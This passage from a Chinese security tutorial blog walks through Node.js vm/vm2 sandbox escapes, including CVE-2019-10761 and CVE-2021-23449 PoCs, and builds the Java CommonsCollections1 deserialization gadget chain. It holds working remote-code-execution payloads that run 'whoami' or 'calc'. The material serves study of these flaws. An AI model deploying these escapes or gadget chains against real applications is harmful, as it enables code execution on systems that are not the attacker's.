options])：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。\n\nconst util = require('util');const vm = require('vm');global.globalVar = 3;const sandbox = { globalVar: 1 };vm.createContext(sandbox);vm.runInContext('globalVar *= 2;', sandbox);console.log(util.inspect(sandbox)); // { globalVar: 2 }console.log(util.inspect(globalVar)); // 3\n\n\nvm.runInNewContext(code[, sandbox][, options]): creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。\nvm.Script类 vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。\nnew vm.Script(code, options)：创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。code：要被解析的JavaScript代码\n\nconst util = require('util');const vm = require('vm');const sandbox = { animal: 'cat', count: 2};const script = new vm.Script('count += 1; name = \"kitty\";');const context = vm.createContext(sandbox);script.runInContext(context);console.log(util.inspect(sandbox));// { animal: 'cat', count: 3, name: 'kitty' }\n\nscript对象可以通过runInXXXContext运行。\n\n\n我们一般进行沙箱逃逸最后都是进行rce，那么在Node里要进行rce就需要procces了，在获取到process对象后我们就可以用require来导入child_process，再利用child_process执行命令。但process挂载在global上，但是我们上面说了在creatContext后是不能访问到global的，所以我们最终的目标是通过各种办法将global上的process引入到沙箱中。\n如果我们把代码改成这样（code参数最好用反引号包裹，这样可以使code更严格便于执行）：\n\"use strict\";const vm = require(\"vm\");const y1 = vm.runInNewContext(`this.constructor.constructor('return process.env')()`);console.log(y1);\n\n\nvm.runInNewContext(`this.constructor.constructor('return process.env')()`);\n\n那么我们是怎么实现逃逸的呢，首先这里面的this指向的是当前传递给runInNewContext的对象，这个对象是不属于沙箱环境的，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的()是调用这个用Function的constructor生成的函数，最终返回了一个process对象。\n下面这行代码也可以达到相同的效果：\nconst y1 = vm.runInNewContext(`this.toString.constructor('return process')()`);\n\n然后我们就可以通过返回的process对象来rce了\ny1.mainModule.require('child_process').execSync('whoami').toString()\n\n\n\n这里知识星球上提到了一个问题，下面这段代码：\nconst vm = require('vm');const script = `m + n`;const sandbox = { m: 1, n: 2 };const context = new vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log(res)\n\n我们能不能把this.toString.constructor('return process')()中的this换成{}呢？ {}的意思是在沙箱内声明了一个对象，也就是说这个对象是不能访问到global下的。\n如果我们将this换成m和n也是访问不到的，因为数字，字符串，布尔这些都是primitive类型，他们在传递的过程中是将值传递过去而不是引用（类似于函数传递形参），在沙盒内使用的mn已经不是原来的mn了，所以无法利用。\n我们将mn改成其他类型就可以利用了：\n\n0x05 vm沙箱逃逸的一些其他情况知识星球里提到了这样的情况：\nconst vm = require('vm');const script = `...`;const sandbox = Object.create(null);const context = vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log('Hello ' + res)\n\n\n\n我们现在的this为null，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性arguments.callee.caller，它可以返回函数的调用者。\n我们上面演示的沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法，这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的arguments.callee.caller就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了。\n\n我们分析一下这段代码\nconst vm = require('vm');const script = `(() =&gt; {    const a = {}    a.toString = function () {      const cc = arguments.callee.caller;      const p = (cc.constructor.constructor('return process'))();      return p.mainModule.require('child_process').execSync('whoami').toString()    }    return a  })()`;const sandbox = Object.create(null);const context = new vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log('Hello ' + res)\n\n我们在沙箱内先创建了一个对象，并且将这个对象的toString方法进行了重写，通过arguments.callee.caller获得到沙箱外的一个对象，利用这个对象的构造函数的构造函数返回了process，再调用process进行rce，沙箱外在console.log中通过字符串拼接的方式触发了这个重写后的toString函数。\n如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，我们可以用Proxy来劫持属性\nProxy 和 Reflect - 掘金 (juejin.cn)\n\nconst vm = require(\"vm\");const script = `(() =&gt;{    const a = new Proxy({}, {        get: function(){            const cc = arguments.callee.caller;            const p = (cc.constructor.constructor('return process'))();            return p.mainModule.require('child_process').execSync('whoami').toString();        }    })    return a})()`;const sandbox = Object.create(null);const context = new vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log(res.abc)\n\n触发利用链的逻辑就是我们在get:这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行，实现了rce。\n如果沙箱的返回值返回的是我们无法利用的对象或者没有返回值应该怎么进行逃逸呢？\n我们可以借助异常，将沙箱内的对象抛出去，然后在外部输出：\n\nconst vm = require(\"vm\");const script = `    throw new Proxy({}, {        get: function(){            const cc = arguments.callee.caller;            const p = (cc.constructor.constructor('return process'))();            return p.mainModule.require('child_process').execSync('whoami').toString();        }    })`;try {    vm.runInContext(script, vm.createContext(Object.create(null)));}catch(e) {    console.log(\"error:\" + e) } \n\n这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。\n0x06 vm2通过上面几个例子可以看出来vm沙箱隔离功能较弱，有很多逃逸的方法，所以第三方包vm2在vm的基础上做了一些优化，我们看一下这些优化具体是怎么实现的。\n安装vm2包：\nnpm install vm2\n\n整个vm2包下是这样的结构：\n\n\ncli.js实现了可以在命令行中调用vm2 也就是bin下的vm2。\n\ncontextify.js封装了三个对象：Contextify Decontextify propertyDescriptor，并且针对global的Buffer类进行了代理。\n\nmain.js 是vm2执行的入口，导出了NodeVM VM 这两个沙箱环境，还有一个VMScript实际上是封装了vm.Script。\n\nsandbox.js针对global的一些函数和变量进行了拦截，比如setTimeout，setInterval等\n\n\nvm2相比vm做出很大的改进，其中之一就是利用了es6新增的proxy特性，从而使用钩子拦截对constructor和__proto__这些属性的访问。\n先用vm2演示一下：\nconst {VM, VMScript} = require('vm2');const script = new VMScript(\"let a = 2;a;\");console.log((new VM()).run(script));\n\nVM是vm2在vm的基础上封装的一个虚拟机，我们只需要实例化后调用其中的run方法就可以运行一段脚本。\n那么vm2在运行这两行代码时都做了什么事：\n\n可以发现相比于vm的沙箱环境，vm2最重要的一步就是引入sandbox.js并针对context做封装。\n那么vm2具体是怎么实现对context的封装？\nvm2出现过多次逃逸的问题，所以现有的代码被进行了大量修改，为了方便分析需要使用较老版本的vm2，但github上貌似将3.9以前的版本全都删除了，所以我这里也找不到对应的资源了，代码分析也比较麻烦，直接移步链接：\nvm2实现原理分析-安全客 - 安全资讯平台 (anquanke.com)\n0x07 vm2中的沙箱绕过CVE-2019-10761该漏洞要求vm2版本&lt;=3.6.10\n\"use strict\";const {VM} = require('vm2');const untrusted = `const f = Buffer.prototype.write;const ft = {\t\tlength: 10,\t\tutf8Write(){\t\t\t\t\t}}function r(i){\tvar x = 0;\ttry{\t\tx = r(i);\t}catch(e){}\tif(typeof(x)!=='number')\t\treturn x;\tif(x!==i)\t\treturn x+1;\ttry{\t\tf.call(ft);\t}catch(e){\t\treturn e;\t}\treturn null;}var i=1;while(1){\ttry{\t\ti=r(i).constructor.constructor(\"return process\")();\t\tbreak;\t}catch(x){\t\ti++;\t}}i.mainModule.require(\"child_process\").execSync(\"whoami\").toString()`;try{\tconsole.log(new VM().run(untrusted));}catch(x){\tconsole.log(x);}\n\n这个链子在p牛的知识星球上有，很抽象，沙箱逃逸说到底就是要从沙箱外获取一个对象，然后获得这个对象的constructor属性，这条链子获取沙箱外对象的方法是 在沙箱内不断递归一个函数，当递归次数超过当前环境的最大值时，我们正好调用沙箱外的函数，就会导致沙箱外的调用栈被爆掉，我们在沙箱内catch这个异常对象，就拿到了一个沙箱外的对象。举个例子：\n假设当前环境下最大递归值为1000，我们通过程序控制递归999次（注意这里说的递归值不是一直调用同一个函数的最大值，而是单次程序内调用函数次数的最大值，也就是调用栈的最大值）：\nr(i);      // 该函数递归999次f.call(ft);    // 递归到第1000次时调用f这个函数，f为Buffer.prototype.write，就是下面图片的这个函数this.utf8Write()   // 递归到1001次时为该函数，是一个外部函数，所以爆栈时捕捉的异常也是沙箱外，从而返回了一个沙箱\t\t\t\t\t外的异常对象\n\n\nCVE-2021-23449 这个漏洞在snyk解释是原型链污染导致的沙箱逃逸，但p牛在知识星球里发了其实是另外的原因\nSandbox Bypass in vm2 | CVE-2021-23449 | Snyk \npoc：\nlet res = import('./foo.js')res.toString.constructor(\"return this\")().process.mainModule.require(\"child_process\").execSync(\"whoami\").toString();\n\nimport()在JavaScript中是一个语法结构，不是函数，没法通过之前对require这种函数处理相同的方法来处理它，导致实际上我们调用import()的结果实际上是没有经过沙箱的，是一个外部变量。 我们再获取这个变量的属性即可绕过沙箱。 vm2对此的修复方法也很粗糙，正则匹配并替换了\\bimport\\b关键字，在编译失败的时候，报Dynamic Import not supported错误。\n知识星球上的另外一个trickSymbol = {  get toStringTag(){    throw f=&gt;f.constructor(\"return process\")()  }};try{  Buffer.from(new Map());}catch(f){  Symbol = {};  f(()=&gt;{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString();}\n\n在vm2的原理中提到vm2会为对象配置代理并初始化，如果对象是以下类型：\n\n就会return Decontextify.instance 函数，这个函数中用到了Symbol全局对象，我们可以通过劫持Symbol对象的getter并抛出异常，再在沙箱内拿到这个异常对象就可以了\n\n","categories":["WebSec"],"tags":["NodeJs"]},{"title":"CommonsCollections1+6","url":"/2023/05/18/CommonsCollections1-6/","content":"CommonsCollections1第一条链子：参考视频：Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili\nJava环境jdk8u65 下载链接：Java Archive Downloads - Java SE 8 (oracle.com)\n什么是CommonsCollectionsCommons：Apache Commons是Apache软件基金会的项目，Commons的目的是提供可重用的解决各种实际问题的Java开源代码。\nCommons Collections：Java中有一个Collections包，内部封装了许多方法用来对集合进行处理，CommonsCollections则是对Collections进行了补充，完善了更多对集合处理的方法，大大提高了性能。\nCommonsCollections1首先我们来看一个接口，该接口内有一个方法：\npublic interface Transformer {    /**     * Transforms the input object (leaving it unchanged) into some output object.     *     * @param input  the object to be transformed, should be left unchanged     * @return a transformed object     * @throws ClassCastException (runtime) if the input is the wrong class     * @throws IllegalArgumentException (runtime) if the input is invalid     * @throws FunctorException (runtime) if the transform cannot be completed     */    public Object transform(Object input);}\n\n我们在该接口的众多实现类中锁定可以利用的类InvokerTransformer，发现InvokerTransformer的transform方法利用反射可以实现任意方法调用，执行过程是先从transform方法接收一个类，通过反射获得这个类的class对象，再通过构造函数接受方法名字，参数类型，参数列表，实现了任意方法调用：\npublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {        super();        iMethodName = methodName;        iParamTypes = paramTypes;        iArgs = args;    }public Object transform(Object input) {        if (input == null) {            return null;        }        try {            Class cls = input.getClass();            Method method = cls.getMethod(iMethodName, iParamTypes);            return method.invoke(input, iArgs);\n\n所以我们可以通过这行代码来弹计算器，其实也就是利用了Invokertransformer中自带的反射省略了反射的步骤：\nRuntime currentRuntime = Runtime.getRuntime();new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(currentRuntime);\n\n我们接着找可利用的类，理想情况下如果有一个类的readObject方法中调用了Invokertransformer.transform，那么这个类就是我们反序列化的起点，但是我们并没有找到一个这样的类，所以接着向下找调用了Invokertransformer.transform的其他类。\n下一个可利用的类就是Commons Collections中的TransformedMap\n类：\n\n我们主要看TransformedMap的构造函数和decorate方法：\n protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {     super(map);     this.keyTransformer = keyTransformer;     this.valueTransformer = valueTransformer; }public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {     return new TransformedMap(map, keyTransformer, valueTransformer); }\n\nTransformedMap的构造方法为protected，因此提供了一个静态方法decorate来使用它的构造方法，decorate接受一个map，两个Transfoemer，并对这两个Transformer做了一个“装饰”操作。\nTransformedMap中找到checkSetValue调用了Invokertransformer.transform：\nprotected Object checkSetValue(Object value) {        return valueTransformer.transform(value);    }\n\n我们将上面弹计算器的payload比对一下：\nnew InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(currentRuntime);\n\n也就是说如果checkSetValue中，我们将valueTransformer替换成InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})，再将transform的参数替换成Runtime对象，就可以替代上面的写法。想要替代valueTransformer可以通过调用TransformedMap.decorate将InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})赋值给valueTransformer，修改payload如下：\nInvokerTransformer invokerTransformer =  new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});        HashMap map = new HashMap();        TransformedMap.decorate(map,null,invokerTransformer);\n\n我们再来看怎么让value可控，首先要找调用checkSetValue的方法：\n我们锁定抽象类AbstractInputCheckedMapDecorator.MapEntry，查看它的setValue方法，并且TransformedMap是该抽象类的实现类：\n\n\nstatic class MapEntry extends AbstractMapEntryDecorator {       /** The parent map */       private final AbstractInputCheckedMapDecorator parent;       protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {           super(entry);           this.parent = parent;       }       public Object setValue(Object value) {           value = parent.checkSetValue(value);           return entry.setValue(value);       }   }\n\n我们发现可以通过调用setValue(currentRuntime)方法来触发其中的checkSetvalue，我们现在需要一个entry来调用它的setValue方法，所以这里遍历一个Map，获取它的entry：\nmap.put(\"k\",\"v\");for (Map.Entry entry:transformedMap.entrySet())       {               entry.setValue(currentRuntime);       }\n\npayload此时修改为：\nRuntime currentRuntime = Runtime.getRuntime();   InvokerTransformer invokerTransformer =  new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});   HashMap map = new HashMap();   map.put(\"k\",\"v\");\t\t\t//随便给map存一对k-v 否则遍历时map为空 拿不到entry   Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer);   for (Map.Entry entry:transformedMap.entrySet()) //entrySet可以将map中的键值对以set储存起来   {           entry.setValue(currentRuntime);   }\n\n我们接着找setValue在其他位置的调用\n\n这里我们需要对环境做一点小配置，由于下一个可利用类AnnotationInvocationHandler是直接反编译出来的，在查找用法时找不到这个类，所以我们要将AnnotationInvocationHandler的java文件添加到jdk中\n\n我们先在openjdk找到有漏洞的java版本：jdk8u/jdk8u/jdk: af660750b2f4 (java.net)\n在下载好的jdk中找到sun包 路径为jdk-af660750b2f4\\\\jdk-af660750b2f4\\\\src\\\\share\\\\classes\n我们找到ysoserial使用的jdk8u65的目录，这里一般分两个情况\n目录下有src.zip，利用解压工具解压后将上一步找到的sun包copy一份到src里\n目录下没有src.zip，我们先在jdk1.8 u65\\\\下新建一个src文件夹，再在jdk1.8 u65\\\\jre\\\\lib下找到rt.jar，注意这里不要用java -jar进行解压，直接用7zip等解压工具解压即可，解压后将里面的所有东西放在jdk1.8 u65\\\\src下，再将上一步的sun包copy到src中\n\n\n最后再在idea中左上角 文件 - 项目结构，在SDK的源路径（source path）中添加src文件夹即可\n\n\n\n查找setValue的调用，发现在AnnotationInvocationHandler的readObject中调用了setValue，跟进查看：\n\nreadObject中有一个遍历map的功能，那么我们现在就可以利用这个功能代替我们上面手动遍历map拿entry的操作了：\n    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) {        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();        if (!type.isAnnotation() ||            superInterfaces.length != 1 ||            superInterfaces[0] != java.lang.annotation.Annotation.class)            throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\");        this.type = type;        this.memberValues = memberValues;    }private void readObject(java.io.ObjectInputStream s)        throws java.io.IOException, ClassNotFoundException {        s.defaultReadObject();        // Check to make sure that types have not evolved incompatibly        AnnotationType annotationType = null;        try {            annotationType = AnnotationType.getInstance(type);        } catch(IllegalArgumentException e) {            // Class is no longer an annotation type; time to punch out            throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");        }        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();        // If there are annotation members without values, that        // situation is handled by the invoke method.        //membersValue是构造函数接收到的一个Map        for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) {            String name = memberValue.getKey();            Class&lt;?&gt; memberType = memberTypes.get(name);            if (memberType != null) {  // i.e. member still exists                Object value = memberValue.getValue();                if (!(memberType.isInstance(value) ||                      value instanceof ExceptionProxy)) {                    memberValue.setValue(                        new AnnotationTypeMismatchExceptionProxy(                            value.getClass() + \"[\" + value + \"]\").setMember(                                annotationType.members().get(name)));                }            }        }    }\n\npayload修改为：\nRuntime currentRuntime = Runtime.getRuntime();       InvokerTransformer invokerTransformer =  new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});       HashMap map = new HashMap();       map.put(\"k\",\"v\");       Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer);       Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");//AnnotationInvocationHandler类为default 不能直接访问 要通过反射获取       Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);//获取构造函数       annotationInvocationHandlerconstructor.setAccessible(true); //实例化       Object o = annotationInvocationHandlerconstructor.newInstance(Override.class,transformedMap);//构造函数第一个参数为注解类型的calss，第二个参数为Map类型的class，也就是readObject中遍历Map时的memberValues    serialize(o);       unserialize(\"ser.bin\");\n\n\n但是这里有几个问题：\n\n\n\nmemberValue.setValue(                        new AnnotationTypeMismatchExceptionProxy(                            value.getClass() + \"[\" + value + \"]\").setMember(                                annotationType.members().get(name)));\n\n这里对setValue传进去的参数应该是currentRuntime，但我们发现这个方法内的参数值我们不确定能不能控制\n2.\ncurrentRuntime是我们自己通过getRuntime方法得到的，但Runtime对象并没有继承Serializable，所以在反序列化时直接传入currentRuntime会导致反序列化失败\nif (memberType != null) {  // i.e. member still exists               Object value = memberValue.getValue();               if (!(memberType.isInstance(value) ||                     value instanceof ExceptionProxy))                     memberValue.setValue\n\n在执行setValue前需要绕过两个if判断\n\n我们先来解决第二个问题，Runtime不能序列化，那么我们可以用Runtime.class来代替它，因为Class类中继承了Serializable，我们先写一个反射弹计算器的paylaod然后修改一下\nClass runtime = Runtime.class;Method execMethod = runtime.getMethod(\"exec\", String.class);Method getRuntime = runtime.getMethod(\"getRuntime\");execMethod.invoke(getRuntime.invoke(null,null),\"calc\");\n\n通过InvokerTransformer获取getRuntime方法：\nMethod getRuntime = (Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class);\n\n我们利用InvokerTransformer执行任意代码的特点执行了getMethod方法，并且参数为getRuntime，最终拿到了getRuntime方法\n接下来我们再利用InvokerTransformer通过执行invoke方法来调用getRuntime方法：\nRuntime currentRuntime = (Runtime) new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntime);\n\n再通过反射弹计算器就可以了，payload修改如下，可以发现这个调用链类似于一个首尾相连的结构，上一个transformer传入下一个进行调用：\nMethod getRuntime = (Method) new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}).transform(Runtime.class);Runtime currentRuntime = (Runtime) new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntime);new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(currentRuntime);\n\njava中刚好有一个Transformer可以让他们串起来，形成这样一个链式调用结构，这样就可以更优雅的执行payload，就是ChainedTransformer，我们将上面的三个transformer以数组格式传入：\nChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{            new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),            new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),            new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})        });        chainedTransformer.transform(Runtime.class);\n\n这样这个问题就解决了，我们把这一串payload结合原先的payload进行替换：\n ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{            new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),            new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),            new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})        });\t   HashMap map = new HashMap();        map.put(\"k\",\"v\");Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);        annotationInvocationHandlerconstructor.setAccessible(true);        Object o = annotationInvocationHandlerconstructor.newInstance(Override.class,transformedMap);        serialize(o);        unserialize(\"ser.bin\");\n\n我们发现并不能成功弹出计算器，这个时候就要解决我们的另外两个问题了，我们先来看一下这两个判断做了什么事\nprivate void readObject(java.io.ObjectInputStream s)    throws java.io.IOException, ClassNotFoundException {    s.defaultReadObject();    // Check to make sure that types have not evolved incompatibly    AnnotationType annotationType = null;    try {        annotationType = AnnotationType.getInstance(type); //type为Override    } catch(IllegalArgumentException e) {        // Class is no longer an annotation type; time to punch out        throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");    }    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); //获取Override中的成员变量    // If there are annotation members without values, that    // situation is handled by the invoke method.    for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) {        String name = memberValue.getKey();        Class&lt;?&gt; memberType = memberTypes.get(name); //必须使返回值不为null 也就是memberTypes中要有name        \t\t\t\t\t\t\t\t\t\t // 所以我们可以让name为Annotion内部的变量值        if (memberType != null) {  // i.e. member still exists            Object value = memberValue.getValue();            if (!(memberType.isInstance(value) ||                  value instanceof ExceptionProxy)) {                memberValue.setValue(                    new AnnotationTypeMismatchExceptionProxy(                        value.getClass() + \"[\" + value + \"]\").setMember(                            annotationType.members().get(name)));            }        }    }}\n\n首先第一个if判断memberType是否为空，memberType是构造函数传入进来的Annotation的成员变量，name是从构造函数传入的map遍历时获取的key，上面代码的注释中提到了如果要绕过这层if，我们传入的map的key中就必须要有传入的Annotation的变量值，但Override内部没有值，所以我们用Target，并且将其中的value属性存入到map中去\n\n\nmap.put(\"value\",\"v\");Object o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);\n\n我们再看第二层if，memberType是一个Annotation，而value是一个V（键值对中的Value类），所以这里直接返回false，通过第二层if：\nObject value = memberValue.getValue();if (!(memberType.isInstance(value) ||                      value instanceof ExceptionProxy )) {                    memberValue.setValue(                        new AnnotationTypeMismatchExceptionProxy(                            value.getClass() + \"[\" + value + \"]\").setMember(                                annotationType.members().get(name)));                }\n\n剩下的最后一个问题，现在setValue中传入的不是我们想要的，这时我们需要另外一个Transformer，ConstantTransformer，\n它的transform方法不论接收什么对象，都可以原封不动的输出一个我们可控的值：\npublic ConstantTransformer(Object constantToReturn) {    super();    iConstant = constantToReturn;}public Object transform(Object input) {    return iConstant;}\n\n所以最终payload修改为：\npublic class CC1Test {    public static void main(String[] args) throws Exception {        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{            new ConstantTransformer(Runtime.class),            new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),            new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),            new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})        });//        chainedTransformer.transform(Runtime.class);//        InvokerTransformer invokerTransformer =  new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});        HashMap map = new HashMap();        map.put(\"value\",\"v\");        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);        annotationInvocationHandlerconstructor.setAccessible(true);        Object o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);        serialize(o);        unserialize(\"ser.bin\");//        Method getRuntime = (Method) new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}).transform(Runtime.class);//        Runtime currentRuntime = (Runtime) new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntime);//        new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(currentRuntime);    }    public static void serialize(Object obj) throws IOException    {        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));        oos.writeObject(obj);    }    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException    {        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    }}\n\n我们把链子倒着推了一遍，在进行反序列化的时候是从我们编写payload的最后开始触发的，也就是AnnotationInvocationHandler的readObject方法，如果还有不懂的地方可以下断点调试一下。\n第二条链子：我们在第一条链子中找InvokerTransformer.transform的下一调用时当时找到了两个Map，但后来我们将三个InvokerTransfomer封装进了一个ChainedTransformer中，所以其实在ChainedTransformer的trnasform中调用的还是InvokerTransformer的transform方法，因此找InvokerTransformer.transform和找ChainedTransformer.transform的后续用法是一样的,第一条链中利用的是TransformedMap，还有另外一个LazyMap，其中的get方法调用了transform，我们在这里跟下去：\npublic ChainedTransformer(Transformer[] transformers) {    super();    iTransformers = transformers;}public Object transform(Object object) {        for (int i = 0; i &lt; iTransformers.length; i++) {            object = iTransformers[i].transform(object);        }        return object;    }\n\n\n看一下LazyMap，get方法中存在factory.transform，factory构造函数可控，所以我们要做的就是将factory传值为ChainedTransformer，并且进入if判断，map中没有key才会触发transform:\nprotected LazyMap(Map map, Transformer factory) {    super(map);    if (factory == null) {        throw new IllegalArgumentException(\"Factory must not be null\");    }    this.factory = factory;}public Object get(Object key) {        // create value for key if key is not currently in the map        if (map.containsKey(key) == false) {            Object value = factory.transform(key);            map.put(key, value);            return value;        }        return map.get(key);    }\n\n我们接着找谁调用了get，findusages结果六千多条我就不找了，最终是锁定在了AnnotationInvocationHandler.invoke上，memberValues是构造函数传入的一个Map：\nObject result = memberValues.get(membjieker);\n\nAnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues)\n\n由于AnnotationInvocationHandler是一个动态代理调用处理器类，当在动态代理中调用AnnotationInvocationHandler的方法时就会自动调用invoke，这里给出的是AnnotationInvocationHandler.readObject，可以说是很巧了，通过自己调用自己，其实用其他的类也是可以的，也算是一个比较有趣的点，我们来看调用过程：\n\n先看invoke：\nif (member.equals(\"equals\") &amp;&amp; paramTypes.length == 1 &amp;&amp;    paramTypes[0] == Object.class)    return equalsImpl(args[0]);if (paramTypes.length != 0)    throw new AssertionError(\"Too many parameters for an annotation method\"); Object result = memberValues.get(member);\n\n想要执行get方法我们要保证前面的两个if不能执行，首先方法名不能为equals，并且要是一个无参方法，在readObject中恰好调用了memberValues的entrySet方法：\nfor (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet())\n\n我们正向梳理一下流程：\n\n共需要两个AnnotationInvocationHandler，第一个AIH中memberValues为Proxy（代理了第二个AnnotationInvocationHandler的动态代理），这样通过调用Proxy.entrySet来触发Proxy的invoke，Proxy中AIH的memberValues为LazyMap，在Proxy的invoke中调用了LazyMap.get，触发ChainedTransformer.transform，剩下的触发点就和之前的第一条链一样了。\n\n开始搓payload：\n由于前面的Transformer部分都一样，所以我直接把在CC1中生成ChainedTrnasformer封装到了一个类的静态方法中，这样在之后的链子中如果用到了ChainedTransformer直接调用这个方法即可：\n\nLazyMap有两个decorate方法和两个构造函数，我们要用的是接收map和Transformer的decorate和构造函数：\npublic static Map decorate(Map map, Transformer factory) {    return new LazyMap(map, factory);}protected LazyMap(Map map, Transformer factory) {        super(map);        if (factory == null) {            throw new IllegalArgumentException(\"Factory must not be null\");        }        this.factory = factory;    }\n\npaylaod：\nChainedTransformer ctf = getChain.getChainedTransformer();HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,ctf);\n\n动态代理：\nChainedTransformer ctf = getChain.getChainedTransformer();HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,ctf);Class AIH = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");Constructor AIHC = AIH.getDeclaredConstructor(Class.class,Map.class);AIHC.setAccessible(true);InvocationHandler AIHCIH = (InvocationHandler) AIHC.newInstance(Override.class,lazymap);Map mapProxy = (Map) Proxy.newProxyInstance(lazymap.getClass().getClassLoader(),new Class[]{Map.class},AIHCIH);Object o = 